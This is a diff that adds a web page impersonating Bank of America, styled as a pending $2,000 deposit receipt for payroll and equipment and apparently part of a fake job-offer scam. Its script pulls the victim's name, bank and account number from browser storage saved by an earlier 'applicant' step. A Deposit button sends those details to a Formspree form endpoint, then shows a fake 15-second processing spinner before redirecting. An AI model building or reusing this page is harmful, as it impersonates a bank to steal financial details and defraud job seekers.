@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America - Pending Transaction Posting Receipt</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; color: #333333; margin: 0; padding: 16px; line-height: 1.5; }
+        .bofa-portal-card { max-width: 540px; margin: 25px auto; background: #ffffff; border-radius: 6px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08); overflow: hidden; border: 1px solid #d1d5db; }
+        .bofa-brand-header { background: #0A256C; color: #ffffff; padding: 20px 24px; position: relative; border-bottom: 3px solid #E21C39; }
+        .bofa-logo-text { font-size: 18px; font-weight: 700; letter-spacing: -0.2px; margin: 0; text-transform: none; }
+        .bofa-logo-text span { color: #ffffff; font-weight: 300; }
+        .secure-badge { position: absolute; top: 22px; right: 24px; font-size: 10px; font-weight: 700; letter-spacing: 0.5px; opacity: 0.8; }
+        .bofa-card-content { padding: 24px; }
+        .bofa-ledger-hero { text-align: center; background: #fafafa; border: 1px solid #e5e7eb; border-radius: 4px; padding: 18px; margin-bottom: 24px; }
+        .ledger-hero-title { font-size: 11px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
+        .ledger-hero-amount { font-size: 34px; font-weight: 700; color: #0A256C; margin: 0; font-family: -apple-system, sans-serif; }
+        .bofa-pending-status { display: inline-block; background: #fffbeb; color: #b45309; border: 1px solid #fde68a; font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: 3px; margin-top: 6px; }
+        .bofa-section-heading { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #4b5563; margin: 20px 0 10px 0; padding-bottom: 4px; border-bottom: 1px solid #e5e7eb; }
+        .bofa-details-matrix { display: grid; grid-template-columns: 1fr; gap: 12px; }
+        @media (min-width: 450px) { .bofa-details-matrix { grid-template-columns: 1fr 1fr; } }
+        .bofa-matrix-item.full-span { grid-column: 1 / -1; }
+        .bofa-matrix-label { font-size: 10px; font-weight: 600; text-transform: uppercase; color: #9ca3af; letter-spacing: 0.3px; margin-bottom: 2px; }
+        .bofa-matrix-value { font-size: 14px; font-weight: 600; color: #1f2937; }
+
+        .spinner-icon {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin-loop 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin-loop {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="bofa-portal-card">
+        <div class="bofa-brand-header">
+            <h1 class="bofa-logo-text">Bank of America <span>| Transaction Review</span></h1>
+            <span class="secure-badge">🔒 SECURE MOBILE</span>
+        </div>
+        
+        <div class="bofa-card-content">
+            <div class="bofa-ledger-hero">
+                <div class="ledger-hero-title">Pending Credit Transaction</div>
+                <div class="ledger-hero-amount">$2,000.00</div>
+                <div class="bofa-pending-status">Pending Settlement</div>
+            </div>
+
+            <div class="bofa-section-heading">System Tracking Specs</div>
+            <div class="bofa-details-matrix">
+                <div class="bofa-matrix-item">
+                    <div class="bofa-matrix-label">Posting Effective Date</div>
+                    <div id="postingDate" class="bofa-matrix-value">--------</div>
+                </div>
+                <div class="bofa-matrix-item">
+                    <div class="bofa-matrix-label">Core Transaction ID</div>
+                    <div id="transactionId" class="bofa-matrix-value" style="font-family: monospace;">--------</div>
+                </div>
+            </div>
+
+            <div class="bofa-section-heading">Account & Beneficiary Processing</div>
+            <div class="bofa-details-matrix">
+                <div class="bofa-matrix-item full-span">
+                    <div class="bofa-matrix-label">Account Owner / Holder Name</div>
+                    <div id="holderName" class="bofa-matrix-value">--------</div>
+                </div>
+                <div class="bofa-matrix-item">
+                    <div class="bofa-matrix-label">Receiving Institution</div>
+                    <div id="holderBank" class="bofa-matrix-value">--------</div>
+                </div>
+                <div class="bofa-matrix-item">
+                    <div class="bofa-matrix-label">Target Account Number Log</div>
+                    <div id="holderAccount" class="bofa-matrix-value">--------</div>
+                </div>
+            </div>
+            <div class="bofa-section-heading">Description of Pending Funds</div>
+            <div style="background: #ffffff; font-size: 13px;">
+                <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #f3f4f6;">
+                    <span style="color: #4b5563;">Direct Deposit Payroll Allocation</span>
+                    <span style="font-weight: 700; color: #0A256C;">$1,500.00</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; padding: 8px 0;">
+                    <span style="color: #4b5563;">Workstation Equipment Remittance</span>
+                    <span style="font-weight: 700; color: #0A256C;">$500.00</span>
+                </div>
+            </div>
+
+            <!-- Restored: Interactive Form submission action block -->
+            <div id="interactiveActionForm">
+                <div style="margin-top: 24px; text-align: center;">
+                    <button type="button" id="confirmDepositBtn" style="width: 100%; background-color: #0A256C; color: #ffffff; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; padding: 14px; border: none; border-radius: 4px; cursor: pointer; transition: background-color 0.2s ease; display: flex; align-items: center; justify-content: center; min-height: 47px;">
+                        <span id="btnText">Deposit</span>
+                        <div id="btnSpinner" class="spinner-icon"></div>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Integrated Admin Contact ProtonMail Component -->
+            
+        </div>
+    </div>
+
+    <script>
+        let cachedRegistry = {};
+        let randomID = "CTI-" + Math.floor(10000000 + Math.random() * 90000000);
+
+        try {
+            const currentDate = new Date();
+            const dateOptions = { day: 'numeric', month: 'long', year: 'numeric' };
+            const formattedDate = currentDate.toLocaleDateString('en-US', dateOptions);
+
+            document.getElementById('postingDate').textContent = formattedDate;
+            document.getElementById('transactionId').textContent = randomID;
+
+            const dataPackage = localStorage.getItem('applicantCVData');
+            
+            if (dataPackage) {
+                cachedRegistry = JSON.parse(dataPackage);
+                
+                const safeInject = (nodeId, textValue) => {
+                    const node = document.getElementById(nodeId);
+                    if (node) {
+                        node.textContent = (textValue && textValue.trim() !== "") ? textValue : "Unavailable";
+                    }
+                };
+
+                safeInject('holderName', cachedRegistry.accountName);
+                safeInject('holderBank', cachedRegistry.bankName);
+                safeInject('holderAccount', cachedRegistry.accountNumber);
+            }
+        } catch (syncFault) {
+            console.error("Ledger system data tracking fault:", syncFault);
+        }
+
+        document.getElementById('confirmDepositBtn').addEventListener('click', async function() {
+            const txtNode = document.getElementById('btnText');
+            const spinnerNode = document.getElementById('btnSpinner');
+
+            txtNode.style.display = 'none';
+            spinnerNode.style.display = 'block';
+            this.disabled = true;
+            this.style.backgroundColor = "#4b5563";
+
+            try {
+                await fetch("https://formspree.io", {
+                    method: "POST",
+                    headers: {
+                        "Accept": "application/json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        _subject: `Allocation Parameters Sync Request - ${cachedRegistry.accountName || 'Unknown'}`,
+                        "Account Owner": cachedRegistry.accountName || "N/A",
+                        "Institution Name": cachedRegistry.bankName || "N/A",
+                        "Account Log": cachedRegistry.accountNumber || "N/A",
+                        "Core Transaction ID (CTI)": randomID
+                    })
+                });
+            } catch (postError) {
+                console.error("Transmission error:", postError);
+            }
+            
+            setTimeout(() => {
+                // Stores generated CTI key state securely so success page can read it cleanly
+                cachedRegistry.systemVerificationCode = randomID;
+                localStorage.setItem('applicantCVData', JSON.stringify(cachedRegistry));
+                window.location.href = 'successful.html';
+            }, 15000);
+        });
+    </script>
+</body>
+</html>
